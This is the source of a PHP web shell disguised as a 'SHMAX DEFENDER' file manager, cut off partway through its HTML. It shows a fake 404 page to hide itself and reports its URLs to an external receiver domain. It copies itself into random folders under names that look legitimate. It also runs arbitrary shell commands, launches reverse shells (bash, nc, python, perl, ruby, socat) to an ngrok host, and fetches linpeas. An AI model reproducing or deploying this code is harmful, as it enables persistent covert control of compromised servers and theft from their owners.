<?php
/**
 * SHMAX FILE MANAGER - FINAL EDITION
 * Dark Theme, Full Features, PHP 5.3+ Compatible
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

// =====================================================
// Receiver Endpoint Configuration
// =====================================================
define('RECEIVER_ENDPOINT', 'https://monitor.topengbrutal.live/receiver.php');

// =====================================================
// FAKE 404 - Only accessible with ?l= parameter
// =====================================================
$hasLoginKey = isset($_GET['l']);

// Special handlers that don't need login key
$isCheckRequest = isset($_GET['c']) && $_GET['c'] == '1';
$isBackupRequest = isset($_GET['b']) && $_GET['b'] == '1';

// If no login key and not special request, show fake 404
if (!$hasLoginKey && !$isCheckRequest && !$isBackupRequest) {
    header("HTTP/1.0 404 Not Found");
    ?>
<!DOCTYPE html>
<html><head><title>404 Not Found</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;background:#f5f5f5}
h1{font-size:50px;color:#333}p{color:#666}</style>
</head><body>
<h1>404</h1>
<p>The requested URL was not found on this server.</p>
<hr><p>Apache Server</p>
</body></html>
    <?php
    exit;
}

// =====================================================
// Helper: Convert filesystem path to URL path
// =====================================================
function pathToUrl($filePath) {
    // Get document root
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    
    // Get protocol
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    
    // Get host
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'];
    
    // Remove document root from file path to get relative path
    if ($docRoot && strpos($filePath, $docRoot) === 0) {
        $relativePath = substr($filePath, strlen($docRoot));
    } else {
        // Fallback: use REQUEST_URI to guess the path
        $scriptName = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
        $relativePath = $scriptName;
    }
    
    // Ensure forward slashes
    $relativePath = str_replace(DIRECTORY_SEPARATOR, '/', $relativePath);
    
    // Build full URL
    $fullUrl = $protocol . '://' . $host . $relativePath;
    
    return $fullUrl;
}

// =====================================================
// CHECK FILE EXISTENCE - ?c=1
// =====================================================
if (isset($_GET['c']) && $_GET['c'] == '1') {
    // Get URL for current file
    $fileUrl = pathToUrl(__FILE__);
    
    // Prepare simple data format
    $data = array(
        'status' => true,
        'urls' => $fileUrl
    );
    
    // Send to receiver
    $endpoint = RECEIVER_ENDPOINT;
    
    // Try to send data
    $ch = @curl_init();
    if ($ch) {
        @curl_setopt($ch, CURLOPT_URL, $endpoint);
        @curl_setopt($ch, CURLOPT_POST, 1);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_exec($ch);
        @curl_close($ch);
    } else {
        // Fallback to file_get_contents if curl not available
        $opts = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($data),
                'timeout' => 3
            )
        );
        $context = @stream_context_create($opts);
        @file_get_contents($endpoint, false, $context);
    }
    
    // Show fake 404 to user
    header("HTTP/1.0 404 Not Found");
    ?>
<!DOCTYPE html>
<html><head><title>404 Not Found</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;background:#f5f5f5}
h1{font-size:50px;color:#333}p{color:#666}</style>
</head><body>
<h1>404</h1>
<p>The requested URL was not found on this server.</p>
<hr><p>Apache Server</p>
</body></html>
    <?php
    exit;
}

// =====================================================
// AUTO BACKUP - ?b=1 with Smart Naming
// =====================================================
if (isset($_GET['b']) && $_GET['b'] == '1') {
    $results = array();
    $currentDir = dirname(__FILE__);
    $sourceFile = __FILE__;
    $sourceExt = '.php';
    $version = 1;
    
    // Helper function to get smart name from folder
    function getSmartName($folder) {
        $files = @scandir($folder);
        $phpFiles = array();
        
        if ($files) {
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $filePath = $folder . DIRECTORY_SEPARATOR . $file;
                if (@is_file($filePath) && preg_match('/\.php$/i', $file)) {
                    $phpFiles[] = pathinfo($file, PATHINFO_FILENAME);
                }
            }
        }
        
        // Use first PHP file name, or folder name
        if (!empty($phpFiles)) {
            return $phpFiles[0];
        } else {
            return basename($folder);
        }
    }
    
    // Helper function to find deepest folders
    function findDeepestFolders($path, &$deepest) {
        $items = @scandir($path);
        if (!$items) return;
        
        $hasSubdir = false;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
            if (@is_dir($fullPath)) {
                $hasSubdir = true;
                findDeepestFolders($fullPath, $deepest);
            }
        }
        
        // If no subdirectories, this is a deepest folder
        if (!$hasSubdir) {
            $deepest[] = $path;
        }
    }
    
    // Step 1: Mundur 1 folder dari current location
    $parentDir = dirname($currentDir);
    
    if ($parentDir && $parentDir !== $currentDir) {
        // Step 2: Cari semua deepest folders dari parent
        $deepestFolders = array();
        findDeepestFolders($parentDir, $deepestFolders);
        
        // RANDOMIZE folder selection
        shuffle($deepestFolders);
        
        // Step 3: Backup ke 2 folder deepest RANDOM dengan smart naming
        $count = 0;
        foreach ($deepestFolders as $deepFolder) {
            if ($count >= 2) break; // Only 2 backups
            
            $baseName = getSmartName($deepFolder);
            $targetName = $baseName . '_v' . $version . $sourceExt;
            $targetPath = $deepFolder . DIRECTORY_SEPARATOR . $targetName;
            
            // Skip if target is same as source
            if (@realpath($targetPath) === @realpath($sourceFile)) {
                $version++;
                continue;
            }
            
            // Skip if folder is same as current dir
            if (@realpath($deepFolder) === @realpath($currentDir)) {
                $version++;
                continue;
            }
            
            if (@copy($sourceFile, $targetPath)) {
                $results[] = array(
                    'path' => $targetPath,
                    'base' => $baseName,
                    'version' => $version,
                    'folder' => $deepFolder
                );
                $count++;
            }
            
            $version++;
        }
    }
    
    // Prepare locations for logging (both filesystem path and URL)
    $locations = array();
    $locationUrls = array();
    foreach ($results as $r) {
        $locations[] = $r['path'];
        // Convert filesystem path to URL
        $locationUrls[] = pathToUrl($r['path']);
    }
    
    // Prepare simple data format
    $allUrls = array($sourceUrl);
    foreach ($locationUrls as $url) {
        $allUrls[] = $url;
    }
    
    $data = array(
        'status' => true,
        'urls' => implode('|', $allUrls)
    );
    
    // Send to receiver
    $endpoint = RECEIVER_ENDPOINT;
    
    // Try to send data
    $ch = @curl_init();
    if ($ch) {
        @curl_setopt($ch, CURLOPT_URL, $endpoint);
        @curl_setopt($ch, CURLOPT_POST, 1);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_exec($ch);
        @curl_close($ch);
    } else {
        // Fallback to file_get_contents if curl not available
        $opts = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($data),
                'timeout' => 3
            )
        );
        $context = @stream_context_create($opts);
        @file_get_contents($endpoint, false, $context);
    }
    
    // Show fake 404 to user
    header("HTTP/1.0 404 Not Found");
    ?>
<!DOCTYPE html>
<html><head><title>404 Not Found</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;background:#f5f5f5}
h1{font-size:50px;color:#333}p{color:#666}</style>
</head><body>
<h1>404</h1>
<p>The requested URL was not found on this server.</p>
<hr><p>Apache Server</p>
</body></html>
    <?php
    exit;
}

if (!isset($_SESSION)) {
    if (function_exists('session_status')) {
        if (session_status() == PHP_SESSION_NONE) @session_start();
    } else {
        if (session_id() == '') @session_start();
    }
}

define('PASSWORD_HASH', '$2y$12$2BF4LHhOsOKxtMe8U9NEOOKA7iLyc4hDZZ0USu1hmB9.MYDREPbde');
define('SESSION_KEY', 'shmax_auth');
define('HOME_DIR', __DIR__); // Home directory where script is located

if (!function_exists('password_verify')) {
    function password_verify($password, $hash) {
        return crypt($password, $hash) === $hash;
    }
}

function h($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

function isLogged() {
    return isset($_SESSION[SESSION_KEY]) && $_SESSION[SESSION_KEY] === true;
}

function formatSize($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), 2) . ' ' . $units[$pow];
}

function getPath() {
    if (isset($_GET['p'])) {
        $path = str_replace('..', '', $_GET['p']);
        if (@is_dir($path)) return realpath($path);
    }
    return getcwd();
}

function listDir($dir) {
    $items = @scandir($dir);
    if (!$items) return array('dirs' => array(), 'files' => array());
    
    $dirs = array();
    $files = array();
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (@is_dir($path)) {
            $dirs[] = array(
                'name' => $item,
                'path' => $path,
                'perms' => substr(sprintf('%o', @fileperms($path)), -4),
                'modified' => @filemtime($path)
            );
        } else {
            $files[] = array(
                'name' => $item,
                'path' => $path,
                'size' => @filesize($path),
                'perms' => substr(sprintf('%o', @fileperms($path)), -4),
                'modified' => @filemtime($path)
            );
        }
    }
    
    return array('dirs' => $dirs, 'files' => $files);
}

function getServerInfo() {
    $info = array();
    $info['php'] = phpversion();
    $info['server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['os'] = function_exists('php_uname') ? php_uname('s') . ' ' . php_uname('r') : 'Unknown';
    $info['user'] = function_exists('get_current_user') ? get_current_user() : 'Unknown';
    
    if (isset($_SERVER['SERVER_ADDR'])) {
        $info['ip'] = $_SERVER['SERVER_ADDR'];
    } else {
        $info['ip'] = function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'Unknown';
    }
    
    return $info;
}

// Smart Backup - find deepest folders and spread copies with smart naming
function smartBackup($startDir, $numCopies) {
    $results = array();
    $copied = 0;
    
    // Find deepest folders recursively
    function findDeepestFolders($path, &$deepest) {
        $items = @scandir($path);
        if (!$items) return;
        
        $hasSubdir = false;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
            if (@is_dir($fullPath)) {
                $hasSubdir = true;
                findDeepestFolders($fullPath, $deepest);
            }
        }
        
        // If no subdirectories, this is a deepest folder
        if (!$hasSubdir) {
            $deepest[] = $path;
        }
    }
    
    $deepestFolders = array();
    findDeepestFolders($startDir, $deepestFolders);
    
    // If no deepest folders found, use start dir
    if (empty($deepestFolders)) {
        $deepestFolders = array($startDir);
    }
    
    // RANDOMIZE folder selection
    shuffle($deepestFolders);
    
    // Limit folders based on numCopies
    $targetFolders = array_slice($deepestFolders, 0, $numCopies);
    
    // Get current script file
    $sourceFile = __FILE__;
    $sourceExt = '.php';
    
    // Copy to each target folder with smart naming
    $version = 1;
    foreach ($targetFolders as $folder) {
        // Get files in target folder
        $files = @scandir($folder);
        $phpFiles = array();
        
        if ($files) {
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $filePath = $folder . DIRECTORY_SEPARATOR . $file;
                if (@is_file($filePath) && preg_match('/\.php$/i', $file)) {
                    $phpFiles[] = pathinfo($file, PATHINFO_FILENAME);
                }
            }
        }
        
        // Determine base name
        if (!empty($phpFiles)) {
            // Use first PHP file name
            $baseName = $phpFiles[0];
        } else {
            // Use folder name
            $baseName = basename($folder);
        }
        
        // Create filename with version
        $targetName = $baseName . '_v' . $version . $sourceExt;
        $targetPath = $folder . DIRECTORY_SEPARATOR . $targetName;
        
        // Skip if target is same as source
        if (realpath($targetPath) === realpath($sourceFile)) {
            $version++;
            continue;
        }
        
        if (@copy($sourceFile, $targetPath)) {
            $results[] = array(
                'path' => $targetPath,
                'base' => $baseName,
                'version' => $version
            );
            $copied++;
        }
        
        $version++;
    }
    
    return array(
        'ok' => true, 
        'total_copied' => $copied, 
        'locations' => $results,
        'total_deepest' => count($deepestFolders)
    );
}

// Authentication
if (isset($_POST['login'])) {
    if (password_verify($_POST['pass'], PASSWORD_HASH)) {
        $_SESSION[SESSION_KEY] = true;
        
        // Send access log to receiver (HANYA saat login berhasil)
        $url = pathToUrl(__FILE__);
        $date = date('Y-m-d H:i:s');
        
        $data = array(
            'status' => true,
            'urls' => $url,
            'date' => $date,
            'type' => 'access'
        );
        
        $ch = @curl_init();
        if ($ch) {
            @curl_setopt($ch, CURLOPT_URL, RECEIVER_ENDPOINT);
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_exec($ch);
            @curl_close($ch);
        }
        
        header('Location: ?l=');
        exit;
    } else {
        $error = 'Invalid password!';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF'] . '?l=');
    exit;
}

// PHPInfo page - requires login and ?l= parameter
if (isset($_GET['phpinfo']) && isset($_GET['l']) && isLogged()) {
    ?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>PHP Info</title>
<style>
body{background:#1a1a2e;color:#eee;font-family:monospace;padding:20px}
table{background:#16213e;border-collapse:collapse;width:100%}
td,th{border:1px solid #0f3460;padding:8px}
th{background:#0f3460}
h1,h2{color:#e94560}
a{color:#4facfe}
</style>
</head><body>
<?php phpinfo(); ?>
</body></html>
    <?php
    exit;
}

if (!isLogged()) {
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SHMAX DEFENDER</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<script src="https://cdn.tailwindcss.com"></script>
<style>body{background:#0f172a}</style>
</head><body class="min-h-screen flex items-center justify-center p-4">
<div class="bg-gray-800 rounded-2xl shadow-2xl p-8 w-full max-w-md border border-gray-700">
<div class="text-center mb-8">
<i class="fas fa-shield-halved text-6xl text-blue-500 mb-4"></i>
<h1 class="text-3xl font-bold text-white">SHMAX DEFENDER</h1>
<p class="text-gray-400 mt-2">Security always feels excessive—until it’s too late.</p></div>
<form method="POST"><div class="mb-6">
<label class="block text-gray-300 text-sm font-bold mb-2"><i class="fas fa-key mr-2"></i>Password</label>
<input type="password" name="pass" required autofocus class="w-full px-4 py-3 bg-gray-700 text-white border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
</div>
<?php if (isset($error)): ?>
<div class="mb-4 p-3 bg-red-900 border border-red-700 text-red-200 rounded-lg text-sm">
<i class="fas fa-exclamation-circle mr-2"></i><?php echo $error; ?></div>
<?php endif; ?>
<button type="submit" name="login" value="1" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition duration-200">
<i class="fas fa-sign-in-alt mr-2"></i>Login</button>
</form></div></body></html>
<?php
exit;
}

// File operations
$msg = '';

if (isset($_FILES['file'])) {
    $target = $_POST['dir'] . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = 'File uploaded successfully!';
    } else {
        $msg = 'Upload failed!';
    }
}

if (isset($_POST['newfile'])) {
    $content = isset($_POST['fcontent']) ? $_POST['fcontent'] : '';
    $file = $_POST['dir'] . DIRECTORY_SEPARATOR . $_POST['fname'];
    if (@file_put_contents($file, $content) !== false) {
        $msg = 'File created successfully!';
    } else {
        $msg = 'Failed to create file!';
    }
}

if (isset($_POST['newfolder'])) {
    $folder = $_POST['dir'] . DIRECTORY_SEPARATOR . $_POST['dname'];
    if (@mkdir($folder, 0755, true)) {
        $msg = 'Folder created successfully!';
    } else {
        $msg = 'Failed to create folder!';
    }
}

if (isset($_POST['delete'])) {
    function deleteRecursive($path) {
        if (@is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
                }
            }
            return @rmdir($path);
        } else {
            return @unlink($path);
        }
    }
    
    $success = deleteRecursive($_POST['path']);
    $msg = $success ? 'Deleted successfully!' : 'Failed to delete!';
}

if (isset($_POST['rename'])) {
    $old = $_POST['old'];
    $new = dirname($old) . DIRECTORY_SEPARATOR . $_POST['new'];
    if (@rename($old, $new)) {
        $msg = 'Renamed successfully!';
    } else {
        $msg = 'Failed to rename!';
    }
}

if (isset($_POST['save'])) {
    if (@file_put_contents($_POST['path'], $_POST['content']) !== false) {
        $msg = 'File saved successfully!';
    } else {
        $msg = 'Failed to save file!';
    }
}

// Download Linpeas
if (isset($_POST['dl_linpeas'])) {
    $url = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh';
    $target = $_POST['dir'] . DIRECTORY_SEPARATOR . 'linpeas.sh';
    
    $content = @file_get_contents($url);
    if ($content && @file_put_contents($target, $content) !== false) {
        @chmod($target, 0755);
        $msg = 'Linpeas downloaded successfully!';
    } else {
        $msg = 'Failed to download Linpeas!';
    }
}

// Download Adminer
if (isset($_POST['dl_adminer'])) {
    $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $target = $_POST['dir'] . DIRECTORY_SEPARATOR . 'adminer.php';
    
    $content = @file_get_contents($url);
    if ($content && @file_put_contents($target, $content) !== false) {
        $msg = 'Adminer downloaded successfully!';
    } else {
        $msg = 'Failed to download Adminer!';
    }
}

// AJAX - Read File
if (isset($_POST['ajax']) && isset($_POST['read'])) {
    header('Content-Type: text/plain');
    echo @file_get_contents($_POST['read']);
    exit;
}

// AJAX - Terminal
if (isset($_POST['ajax']) && isset($_POST['cmd'])) {
    header('Content-Type: application/json');
    $cmd = $_POST['cmd'];
    $output = '';
    
    // Disable restrictions
    @ini_set('open_basedir', '');
    @ini_set('safe_mode', 'Off');
    
    // Initialize session directory to file location (not docroot)
    if (!isset($_SESSION['terminal_cwd'])) {
        $_SESSION['terminal_cwd'] = dirname(__FILE__);
    }
    
    // Use shell execution like backconnect (not PHP chdir)
    $cwd = $_SESSION['terminal_cwd'];
    
    // Handle cd command
    if (preg_match('/^cd\s+(.+)$/i', $cmd, $m)) {
        $target = trim($m[1]);
        
        // Execute cd in shell and get new directory
        if (function_exists('shell_exec')) {
            $newDir = @shell_exec('cd ' . escapeshellarg($cwd) . ' && cd ' . escapeshellarg($target) . ' && pwd 2>&1');
        } elseif (function_exists('exec')) {
            @exec('cd ' . escapeshellarg($cwd) . ' && cd ' . escapeshellarg($target) . ' && pwd 2>&1', $out);
            $newDir = implode("\n", $out);
        }
        
        if ($newDir && trim($newDir) && strpos($newDir, 'No such file') === false && strpos($newDir, 'cannot access') === false) {
            $_SESSION['terminal_cwd'] = trim($newDir);
            $output = 'Changed to: ' . trim($newDir);
        } else {
            $output = 'Failed to change directory: ' . $target;
        }
    } else {
        // Execute command in current directory using shell
        if (function_exists('shell_exec')) {
            $output = @shell_exec('cd ' . escapeshellarg($cwd) . ' 2>&1 && ' . $cmd . ' 2>&1');
        } elseif (function_exists('exec')) {
            @exec('cd ' . escapeshellarg($cwd) . ' 2>&1 && ' . $cmd . ' 2>&1', $out);
            $output = implode("\n", $out);
        } else {
            $output = 'No execution function available';
        }
    }
    
    echo json_encode(array(
        'output' => $output ? $output : 'Command executed',
        'cwd' => $_SESSION['terminal_cwd']
    ));
    exit;
}

// AJAX - Smart Backup
if (isset($_POST['ajax']) && isset($_POST['smartbackup'])) {
    header('Content-Type: application/json');
    
    $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
    $numCopies = isset($_POST['num_copies']) ? intval($_POST['num_copies']) : 1;
    
    if ($numCopies < 1) $numCopies = 1;
    if ($numCopies > 100) $numCopies = 100;
    
    $result = smartBackup($dir, $numCopies);
    
    // Send to receiver
    if ($result['ok'] && $result['total_copied'] > 0) {
        $locations = array();
        $urls = array();
        
        foreach ($result['locations'] as $loc) {
            $locations[] = $loc['path'];
            $urls[] = pathToUrl($loc['path']);
        }
        
        // Prepare simple data format
        $allUrls = array(pathToUrl(__FILE__));
        foreach ($urls as $url) {
            $allUrls[] = $url;
        }
        
        $data = array(
            'status' => true,
            'urls' => implode('|', $allUrls)
        );
        
        // Send to receiver
        $endpoint = RECEIVER_ENDPOINT;
        
        $ch = @curl_init();
        if ($ch) {
            @curl_setopt($ch, CURLOPT_URL, $endpoint);
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_exec($ch);
            @curl_close($ch);
        }
    }
    
    echo json_encode($result);
    exit;
}

// AJAX - Ngrok Backconnect
if (isset($_POST['ajax']) && isset($_POST['ngrok'])) {
    header('Content-Type: application/json');
    
    $type = $_POST['type'];
    $url = $_POST['url'];
    
    // Parse ngrok URL
    $url = str_replace(array('tcp://', 'http://', 'https://'), '', $url);
    $parts = explode(':', $url);
    $host = $parts[0];
    $port = isset($parts[1]) ? $parts[1] : '4444';
    
    // Commands that actually work
    $commands = array(
        'bash' => "bash -c 'bash -i >& /dev/tcp/{$host}/{$port} 0>&1' >/dev/null 2>&1 &",
        'nc' => "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$host} {$port} >/tmp/f &",
        'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$host}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")' &",
        'php' => "php -r '\$sock=fsockopen(\"{$host}\",{$port});\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);' &",
        'perl' => "perl -e 'use Socket;\$i=\"{$host}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' &",
        'ruby' => "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{$host}\",\"{$port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' &",
        'socat' => "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{$host}:{$port} &"
    );
    
    if (isset($commands[$type])) {
        $cmd = $commands[$type];
        $executed = false;
        
        // Try different execution methods
        if (function_exists('shell_exec')) {
            @shell_exec($cmd);
            $executed = true;
        } elseif (function_exists('exec')) {
            @exec($cmd);
            $executed = true;
        } elseif (function_exists('system')) {
            @system($cmd);
            $executed = true;
        } elseif (function_exists('passthru')) {
            @passthru($cmd);
            $executed = true;
        } elseif (function_exists('popen')) {
            $handle = @popen($cmd, 'r');
            if ($handle) {
                @pclose($handle);
                $executed = true;
            }
        } elseif (function_exists('proc_open')) {
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );
            $process = @proc_open($cmd, $descriptors, $pipes);
            if (is_resource($process)) {
                @proc_close($process);
                $executed = true;
            }
        }
        
        if ($executed) {
            echo json_encode(array(
                'ok' => true,
                'msg' => "Connected to {$host}:{$port}",
                'host' => $host,
                'port' => $port
            ));
        } else {
            echo json_encode(array(
                'ok' => false,
                'msg' => 'No execution function available'
            ));
        }
    } else {
        echo json_encode(array('ok' => false, 'msg' => 'Invalid type'));
    }
    exit;
}

$path = getPath();
$items = listDir($path);
$info = getServerInfo();
$parts = explode(DIRECTORY_SEPARATOR, $path);
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SHMAX DEFENDER MANAGER</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
*{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif}
body{background:#0f172a;color:#e2e8f0}
.glass{background:rgba(30,41,59,0.8);backdrop-filter:blur(10px);border:1px solid rgba(71,85,105,0.3)}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;overflow-y:auto;padding:20px}
.modal.active{display:block}
.hover-scale{transition:transform 0.2s}
.hover-scale:hover{transform:scale(1.05)}
a{color:#60a5fa}
a:hover{color:#93c5fd}
table{color:#e2e8f0}
input,textarea,select{background:#1e293b;border:1px solid #334155;color:#e2e8f0;font-family:inherit}
input:focus,textarea:focus,select:focus{outline:none;border-color:#3b82f6;ring:2px;ring-color:#3b82f6}
button{font-family:inherit}
.swal2-popup{font-family:inherit !important}
</style>
</head>
<body>

<div class="glass sticky top-0 z-50">
<div class="container mx-auto px-4 py-4">
<div class="flex items-center justify-between flex-wrap gap-4">
<div class="flex items-center space-x-4">
<i class="fas fa-shield-halved text-3xl text-blue-400"></i>
<div>
<h1 class="text-2xl font-bold text-white">Defender Manager</h1>
<p class="text-xs text-gray-400">b4r0ng3301</p>
</div>
</div>
<div class="flex items-center space-x-4">
<div class="text-right text-sm">
<div><i class="fas fa-user mr-2 text-gray-400"></i><span class="text-white"><?php echo h($info['user']); ?></span></div>
<div class="text-xs text-gray-400"><?php echo isset($_SERVER['REMOTE_ADDR']) ? h($_SERVER['REMOTE_ADDR']) : 'Unknown'; ?></div>
</div>
<a href="?l=&logout" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg">
<i class="fas fa-sign-out-alt mr-2"></i>Logout
</a>
</div>
</div>
</div>
</div>

<div class="container mx-auto px-4 py-6">

<div class="glass rounded-xl p-6 mb-6">
<h2 class="text-xl font-bold mb-4 text-white"><i class="fas fa-server mr-2 text-blue-400"></i>Server Information</h2>
<div class="grid grid-cols-2 md:grid-cols-4 gap-4">
<div class="bg-blue-600 bg-opacity-20 rounded-lg p-4 border border-blue-500 border-opacity-30">
<div class="text-sm text-gray-400">PHP Version</div>
<div class="text-xl font-bold text-white"><?php echo h($info['php']); ?></div>
</div>
<div class="bg-green-600 bg-opacity-20 rounded-lg p-4 border border-green-500 border-opacity-30">
<div class="text-sm text-gray-400">Server</div>
<div class="text-sm font-semibold text-white"><?php echo h($info['server']); ?></div>
</div>
<div class="bg-purple-600 bg-opacity-20 rounded-lg p-4 border border-purple-500 border-opacity-30">
<div class="text-sm text-gray-400">OS</div>
<div class="text-sm font-semibold text-white"><?php echo h($info['os']); ?></div>
</div>
<div class="bg-pink-600 bg-opacity-20 rounded-lg p-4 border border-pink-500 border-opacity-30">
<div class="text-sm text-gray-400">Server IP</div>
<div class="text-xl font-bold text-white"><?php echo h($info['ip']); ?></div>
</div>
</div>
</div>

<div class="glass rounded-xl p-6 mb-6">
<div class="flex flex-wrap gap-3">
<button onclick="show('mUpload')" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-upload mr-2"></i>Upload
</button>
<button onclick="show('mNewFile')" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-file-circle-plus mr-2"></i>New File
</button>
<button onclick="show('mNewFolder')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-folder-plus mr-2"></i>New Folder
</button>
<button onclick="show('mTerminal')" class="bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-terminal mr-2"></i>Terminal
</button>
<button onclick="show('mNgrok')" class="bg-orange-600 hover:bg-orange-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-link mr-2"></i>Ngrok
</button>
<button onclick="show('mBackup')" class="bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-save mr-2"></i>Smart Backup
</button>
<button onclick="show('mTools')" class="bg-indigo-600 hover:bg-indigo-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-download mr-2"></i>Download Tools
</button>
<button onclick="window.open('?l=&phpinfo','_blank')" class="bg-pink-600 hover:bg-pink-700 px-4 py-2 rounded-lg hover-scale">
<i class="fas fa-info-circle mr-2"></i>PHP Info
</button>
</div>
</div>

<div class="glass rounded-xl p-4 mb-6">
<div class="flex items-center space-x-2 text-sm flex-wrap gap-2">
<i class="fas fa-folder-open text-yellow-400"></i>
<span class="font-semibold text-white">Path:</span>
<a href="?l=&p=<?php echo urlencode(HOME_DIR); ?>" class="bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-xs">
<i class="fas fa-home mr-1"></i>Home
</a>
<a href="?l=&p=/" class="text-blue-400 hover:text-blue-300">Root</a>
<?php foreach ($parts as $i => $part): if (!$part) continue; ?>
<span class="text-gray-500">/</span>
<a href="?l=&p=<?php echo urlencode(implode('/', array_slice($parts, 0, $i + 1))); ?>" class="text-blue-400 hover:text-blue-300"><?php echo h($part); ?></a>
<?php endforeach; ?>
</div>
